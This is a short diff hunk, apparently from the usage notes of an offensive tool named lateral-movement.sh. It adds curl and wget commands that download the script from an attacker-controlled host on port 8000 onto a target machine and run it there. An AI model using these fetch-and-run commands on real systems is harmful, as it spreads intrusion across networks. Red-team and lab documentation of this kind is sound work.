@@ -23,7 +23,9 @@ Local network:
 # Host
 sh lateral-movement.sh -w
 # Target
-curl -LJO <Host>:8000/
+curl -LJO <Host>:8000/lateral-movement.sh #or
+curl <Host>:8000/lateral-movement.sh > lateral-movement.sh #or
+wget <Host>:8000/lateral-movement.sh
 sh lateral-movement.sh -h
 ```
 
